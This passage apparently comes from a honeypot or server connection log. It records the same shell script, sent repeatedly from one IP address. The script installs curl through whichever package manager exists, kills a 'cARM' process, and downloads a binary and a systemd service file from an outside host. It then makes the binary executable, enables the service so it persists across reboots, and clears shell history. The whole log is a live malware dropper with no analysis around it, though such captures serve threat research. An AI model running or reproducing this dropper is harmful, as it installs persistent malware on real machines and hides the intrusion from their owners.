		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:01.735208 - ('45.148.10.203', 38508) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:04.628482 - ('45.148.10.203', 38514) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:08.222663 - ('45.148.10.203', 38530) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:12.288177 - ('45.148.10.203', 52040) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:16.300916 - ('45.148.10.203', 52044) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:19.525754 - ('45.148.10.203', 48980) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:23.597255 - ('45.148.10.203', 48994) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:27.357119 - ('45.148.10.203', 49010) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:31.025995 - ('45.148.10.203', 40450) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	else 
		echo "Kein unterstützter Paketmanager gefunden. Bitte manuell installieren.";
		exit 1;
	fi
	

2024-11-24 11:26:34.561359 - ('45.148.10.203', 40472) - 
	if command -v apt >/dev/null 2>&1; then 
		apt -y update && apt -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v yum >/dev/null 2>&1; then 
		yum -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v dnf >/dev/null 2>&1; then 
		dnf -y install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v pacman >/dev/null 2>&1; then 
		pacman -Sy --noconfirm curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v zypper >/dev/null 2>&1; then 
		zypper --non-interactive install curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
		history -c;
	elif command -v apk >/dev/null 2>&1; then 
		apk add --no-cache curl && \
		rm -rf /etc/de && pkill cARM && \
		mkdir -p /etc/de && \
		curl -k -o /etc/de/cARM http://51.81.121.129/cARM && \
		curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && \
		chmod 777 /etc/de/cARM && \
		systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && \
